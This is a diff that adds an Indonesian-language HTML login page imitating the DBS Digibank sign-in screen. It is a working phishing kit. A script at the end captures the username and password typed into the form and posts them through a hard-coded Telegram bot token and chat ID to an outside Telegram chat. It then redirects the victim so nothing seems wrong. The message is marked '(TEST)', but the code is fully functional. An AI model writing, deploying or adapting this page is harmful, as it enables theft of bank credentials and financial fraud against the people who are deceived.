@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login Digibank</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+ <style>
+  body {
+    background-image: url('yes.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  }
+</style>
+
+</head>
+<body class="relative flex items-center justify-center px-4 min-h-screen overflow-hidden">
+
+  <!-- Background blur -->
+<div class="absolute inset-0 bg-black/30  z-0"></div>
+
+
+  <!-- Login Box -->
+  <div class="z-10 w-full max-w-sm  text-white rounded-md px-6 pt-6 pb-4 relative ">
+    
+    <!-- Close button -->
+    <button class="absolute top-4 left-4 text-white text-2xl font-bold">&times;</button>
+
+    <!-- Logo -->
+    <div class="flex items-center justify-center mb-6">
+      <img src="testerrrr.png" alt="digibank logo" class="h-7" style="width: 150px; height: 100px;">
+    </div>
+
+    <!-- Form -->
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Username" required
+        class="w-full mb-4 px-4 py-3 bg-white text-black rounded outline-none focus:ring-2 focus:ring-blue-500">
+      <input type="password" name="password" placeholder="Password" required
+        class="w-full mb-4 px-4 py-3 bg-white text-black rounded outline-none focus:ring-2 focus:ring-blue-500">
+
+      <button type="submit"
+        class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded transition-colors">
+        LOG IN
+      </button>
+    </form>
+
+    <!-- Lupa password -->
+    <div class="mt-4 text-sm text-center text-gray-300">
+      <a href="#" class="hover:underline">Lupa <u>username</u> atau <u>password</u>?</a>
+    </div>
+
+    <!-- Registrasi -->
+    <div class="mt-6">
+      <p class="text-sm text-center text-gray-400 mb-2">
+        Belum punya username & password untuk akses rekening DBS, Kartu Kredit atau Cashline?
+      </p>
+      <a href="index.html"
+        class="block w-full border border-gray-500 text-center text-gray-300 py-3 rounded hover:bg-gray-700 transition-colors">
+        REGISTRASI
+      </a>
+    </div>
+  </div>
+
+  <!-- Kirim ke Telegram -->
+<script>
+  const token = '8474317370:AAHQre6cvdPCDBj-4lbiy7Qi5nZfvBSJz6g';
+  const chat_id = '5801473402';
+
+  document.getElementById('loginForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+    const username = this.username.value.trim();
+    const password = this.password.value.trim();
+
+    const message = `🔐 *Login Digibank (TEST)*\n\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\``;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    }).then(response => {
+      if (response.ok) {
+        // Sukses kirim => redirect ke index.html
+        window.location.href = "index.html";
+      } else {
+        alert("Gagal mengirim!");
+      }
+    }).catch(error => {
+      console.error("Telegram Error:", error);
+      alert("Gagal mengirim data.");
+    });
+  });
+</script>
+
+</body>
+</html>
